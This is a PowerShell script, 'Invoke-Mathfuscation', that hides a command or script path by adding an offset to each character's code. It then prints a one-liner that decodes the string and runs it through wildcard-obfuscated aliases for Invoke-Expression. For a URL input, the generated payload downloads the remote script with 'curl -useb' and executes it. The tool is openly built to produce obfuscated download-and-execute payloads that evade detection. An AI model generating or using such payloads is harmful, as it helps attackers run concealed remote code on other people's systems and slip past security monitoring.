<# 
.SYNOPSIS
    A quick tool that generates uses simple addition to obfuscate individual characters, then executes it

.DESCRIPTION 
 
.NOTES 
    Use at your own risk.

.COMPONENT 

.LINK 
    Useful Link to ressources or others.
 
.Parameter ParameterName 
    None, user imput required when prompted. 
#>

$cow = " ______________________`n< Invoke-Mathfuscation >`n ----------------------`n        \   ^__^`n         \  (oo)\_______`n            (__)\       )\/\`n                ||----w |`n                ||     ||`n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`n"
Write-Output $cow

$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop

$tochar = Read-Host -Prompt "Provide a command, full path to a .ps1 file (local or remote)"

$raw = $tochar.ToCharArray()
$space = $tochar.ToCharArray() | %{([int][char]$_) }

$com = $space -join ","
$charCom = $space | ForEach-Object {"[char]$_"}
$char = $charCom -join ","

Write-Host "`nConverted Char Values:"
Write-Host $com -ForegroundColor Green
Write-Host "`nConverted Char Values in [char] format:"
Write-Host $char -ForegroundColor Green

Try{ 
    [uint32]$shift = Read-Host -Prompt "`n`nWhat number shoud be added (int)?" -ErrorAction stop
} 
Catch [System.Net.WebException],[System.IO.IOException] { 
    throw "Was this a number?" 
    break
}


$added = $space | ForEach-Object {($_+$shift)}
$charShift = $added | ForEach-Object {"[char]$_"}
$modChar = $added -join ","


Write-Host "`nModified Char Values:"
Write-Host $modChar -ForegroundColor Cyan
Write-Host "`nHere's your obfuscated payload!`n"

$invokes = @('(ga`l ?[?e]x)','(gal ?[?e]x)','(gcm ?[?e]x)','(gcm ?[?e]x)','(gal ?e[?x])','(gcm ?e[?x])','(`ga`l i?[?x])','(`gcm i?[?x])')

function CalcPayload() {
    $randVar = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
    if($tochar -clike 'http*') {
        Write-Host ('@(' + $modChar + ')| % {$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
    } else {
        Write-Host ('@(' + $modChar + ')| % {$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
    }
}
CalcPayload
